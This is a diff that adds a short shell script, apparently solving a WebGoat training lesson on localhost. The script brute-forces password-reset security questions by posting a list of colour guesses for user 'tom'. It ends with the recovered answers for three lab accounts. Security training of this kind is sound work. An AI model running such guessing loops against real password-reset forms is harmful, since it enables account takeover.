@@ -1,0 +1,26 @@
+for i in red green yellow blue pink purple violet orange cian
+      curl 'http://127.0.0.1:8090/WebGoat/PasswordReset/questions' \
+          -X 'POST' \
+          -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+          -H 'Accept: */*' \
+          -H 'Sec-Fetch-Site: same-origin' \
+          -H 'Accept-Language: en-GB,en;q=0.9' \
+          -H 'Accept-Encoding: gzip, deflate' \
+          -H 'Sec-Fetch-Mode: cors' \
+          -H 'Host: 127.0.0.1:8090' \
+          -H 'Origin: http://127.0.0.1:8090' \
+          -H 'Content-Length: 35' \
+          -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15' \
+          -H 'Referer: http://127.0.0.1:8090/WebGoat/start.mvc?username=asdasd' \
+          -H 'Connection: keep-alive' \
+          -H 'Sec-Fetch-Dest: empty' \
+          -H 'Cookie: JSESSIONID=POsVINAwdyMpzWr-OJbVJJUam1lj1cndYkG9Yvs0' \
+          -H 'X-Requested-With: XMLHttpRequest' \
+          --data "username=tom&securityQuestion=$i"
+  end
+  
+  
+  tom - pink
+  admin - green
+  larry - yellow
+  
